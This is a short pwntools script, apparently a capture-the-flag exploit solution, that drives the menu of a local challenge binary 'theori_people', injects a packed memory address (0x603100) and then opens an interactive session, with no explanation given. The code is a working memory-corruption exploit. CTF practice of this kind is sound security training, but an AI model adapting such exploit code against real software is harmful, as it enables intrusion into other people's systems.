#!/usr/bin/python

from pwn import *

p = process('./theori_people')

p.recvuntil('#')
p.sendline('1')
p.sendline('1')
p.sendline('1')
p.sendline('2')

p.sendline('2')
p.sendline('0')
p.sendline('Yes')
p.sendline('20')
p.sendline(p64(0x603100))

p.sendline('3')
p.sendline('0')

p.interactive()
